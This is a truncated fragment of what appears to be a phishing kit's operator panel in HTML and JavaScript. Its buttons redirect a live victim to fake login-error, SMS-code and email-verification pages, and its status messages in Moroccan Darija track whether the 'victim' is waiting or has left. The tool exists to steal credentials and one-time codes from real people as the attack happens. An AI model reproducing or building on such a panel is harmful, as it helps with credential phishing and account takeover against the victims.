...
" onclick="redirect(1)">LOGIN ERROR</button><br>
<button style="
    background-color: black; 
    color: #39FF14;  /* Neon green */
    font-size: 20px; 
    ...
    cursor: pointer;
    text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
" onclick="redirect(2)">SMS</button><br>
<button style="
    background-color: black; 
    color: #39FF14;  /* Neon green */
    font-size: 20px; 
    ...
    cursor: pointer;
    text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
" onclick="redirect(3)">SMS ERROR</button><br>
<button style="
    background-color: black; 
    color: #39FF14;  /* Neon green */
    font-size: 20px; 
    ...
    cursor: pointer;
    text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
" onclick="redirect(4)">EMAIL</button><br>
<button style="
    background-color: black; 
    color: #39FF14;  /* Neon green */
    font-size: 20px; 
    ...
    cursor: pointer;
    text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
" onclick="redirect(5)">EMAIL ERROR</button><br>
<button  style="
    background-color: black; 
    color: #39FF14;  /* Neon green */
    font-size: 20px; 
    ...
    cursor: pointer;
    text-shadow: 0 0 5px #39FF14, 0 0 10px #39FF14, 0 0 20px #39FF14;
" onclick="redirect(6)">DONE</button><br>
</div>
</div>
...
<i class="fa fa-ban"></i> Lvictiiim mchaaa
</div>
</div>
	...
	function(done){	
		const data = JSON.parse(done);
			if(data.page.includes('LOADING')==true && data.statu=="on"){
				$("#current_page").html("<b style='color:red;'>Victim kaysaynk tedih lchi blassa hh... <br>"+data.page+"</b>");
			}else{
